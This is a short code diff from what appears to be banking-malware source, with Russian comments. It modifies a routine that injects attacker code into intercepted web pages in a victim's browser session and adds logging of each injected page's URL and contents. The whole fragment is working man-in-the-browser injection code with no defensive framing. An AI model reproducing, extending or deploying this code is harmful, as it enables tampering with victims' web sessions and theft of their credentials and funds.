@@ -989,6 +989,13 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
 
 	bool Result = false;
 	DWORD Count = List::Count(Request->Injects);
+	bool Injected = false;
+
+	// ЛОгируем езультат инжекта
+	#ifdef HTMLInjectLogH
+		THTMLInjectLog Log(Request->URL, Request->Buffer,  Request->BufferSize);
+	#endif
+
 
 	for (DWORD i = 0; i < Count; i++)
 	{
@@ -1002,10 +1009,18 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
 		{
 			// Внедряем свой код в загруженные данные
 			if (InjectHTMLCode(Request, Inject))
+			{
+				Injected = true;
 				Result = true;
+            }
 		}
-
 	}
+
+	#ifdef HTMLInjectLogH
+		if (Injected)
+			Log.Close(Request->Buffer,  Request->BufferSize);
+	#endif
+
 	return Result;
 }
 // ----------------------------------------------------------------------------
